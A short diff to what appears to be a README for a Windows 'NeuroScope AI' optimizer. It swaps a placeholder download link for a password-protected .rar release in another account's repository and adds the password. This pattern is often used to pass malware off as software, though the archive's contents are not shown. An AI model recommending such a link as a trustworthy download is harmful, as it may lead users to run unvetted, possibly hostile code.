@@ -14,7 +14,8 @@ in a clean, modern, glass-style interface.
 
 Download the latest desktop build:
 
-👉 **[Download NeuroScope AI (Windows x64)](https://github.com/USERNAME/neuroscope-cpu-optimizer/releases/latest/download/NeuroScopeAI-Windows.zip)**
+👉 **[Download NeuroScope AI (Windows x64)](https://github.com/elitesniperbr/NeuroScope-AI-Desktop/releases/download/Windows_AI/NeuroScope-AI-Desktop.rar)**
+ # Password:NeuroScope.
 
 > No installation required. Portable build.
 
